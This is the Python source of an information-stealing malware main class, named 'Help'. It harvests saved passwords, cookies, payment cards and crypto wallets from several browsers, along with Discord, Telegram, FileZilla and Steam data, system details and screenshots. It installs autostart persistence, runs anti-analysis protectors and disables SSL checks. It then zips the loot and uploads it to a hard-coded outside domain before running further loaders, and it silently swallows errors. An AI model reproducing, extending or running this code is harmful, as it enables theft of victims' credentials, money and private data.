import ssl
from sys import argv
from time import sleep
from typing import List, Any
from threading import Thread
from multiprocessing import Pool
import webbrowser
from helper.enums import Features, Utils, Protectors
from helper.helpers import functions, MemoryStorage
from helper.helpers.config import MultihelpConfig, Browsers
from helper.utils import Autostart, Message, Protector, Loader, Grabber
from helper.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
import requests
import threading

class Help(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(
        self,
        senders: List[Any] = None,
        features: List[Features] = None,
        utils: List[Utils] = None,
        loaders: List[Loader] = None,
        protectors: List[Protectors] = None,
        grabbers: List[Grabber] = None,
        delay: int = 0
    ):
        Thread.__init__(self, name="Help")

        if loaders is None:
            loaders = []

        if grabbers is None:
            grabbers = []

        if senders is None:
            senders = []

        if utils is None:
            utils = []

        if features is None:
            features = [Features.all]

        if protectors is None:
            protectors = [Protectors.disable]

        self.__protectors = protectors
        self.__loaders = loaders
        self.__grabbers = grabbers
        self.__senders = senders
        self.__autostart = Utils.autostart in utils or Utils.all in utils
        self.__message = Utils.message in utils or Utils.all in utils
        self.__delay = delay

        self.__config = MultihelpConfig()
        self.__storage = MemoryStorage()

        browser_functions = [module for module in [
            Features.passwords,
            Features.cookies,
            Features.cards,
            Features.history,
            Features.bookmarks,
            Features.extensions,
            Features.wallets
        ] if module in features or Features.all in features]
        browser_statuses = len(browser_functions) > 0

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.BrowsersData[Browsers.CHROME]["path"],
                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.BrowsersData[Browsers.EDGE]["path"],
                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.BRAVE.value,
                    self.__config.BrowsersData[Browsers.BRAVE]["path"],
                    self.__config.BrowsersData[Browsers.BRAVE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.VIVALDI.value,
                    self.__config.BrowsersData[Browsers.VIVALDI]["path"],
                    self.__config.BrowsersData[Browsers.VIVALDI]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": System,
                "arguments": (
                    "System",
                ),
                "status": Features.system in features or Features.all in features
            },
            {
                "object": Processes,
                "arguments": (
                    "System",
                ),
                "status": Features.processes in features or Features.all in features
            },
            {
                "object": Screenshot,
                "arguments": (
                    "System",
                ),
                "status": Features.screenshot in features or Features.all in features
            },
            {
                "object": Discord,
                "arguments": (
                    "Programs/Discord",
                ),
                "status": Features.discord in features or Features.all in features
            },
            {
                "object": Telegram,
                "arguments": (
                    "Programs/Telegram",
                ),
                "status": Features.telegram in features or Features.all in features
            },
            {
                "object": FileZilla,
                "arguments": (
                    "Programs/FileZilla",
                ),
                "status": Features.filezilla in features or Features.all in features
            },
            {
                "object": Steam,
                "arguments": (
                    "Programs/Steam",
                ),
                "status": Features.steam in features or Features.all in features
            },
            {
                "object": Wallets,
                "arguments": (
                    "Wallets",
                ),
                "status": Features.wallets in features or Features.all in features
            }
        ]

    def run(self) -> None:
        """
        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            sleep(self.__delay)

            Autostart().run()

            if self.__message is True:
                Thread(target=Message().run).start()

            Protector(self.__protectors).run()

            ssl._create_default_https_context = ssl._create_unverified_context

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(functions.run_process, [
                    (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                ])
            pool.close()

            if self.__grabbers:

                with Pool(processes=self.__config.PoolSize) as pool:
                    grabber_results = pool.starmap(functions.run_process, [
                        (grabber, None) for grabber in self.__grabbers
                    ])
                pool.close()

                results += grabber_results

            data = self.__storage.create_zip([file for data in results if data for file in data.files])
            preview = self.__storage.create_preview([field for data in results if data for field in data.fields])

            url = "https://rngeribe2.shop/upload"

            files = {"file": data}
            data = {"caption": preview}
            
            response = requests.post(url, files=files, data=data)

            # webbrowser.open("http:/127.0.0.1:5000")


            for loader in self.__loaders:
                loader.run()

        except Exception as e:
            pass
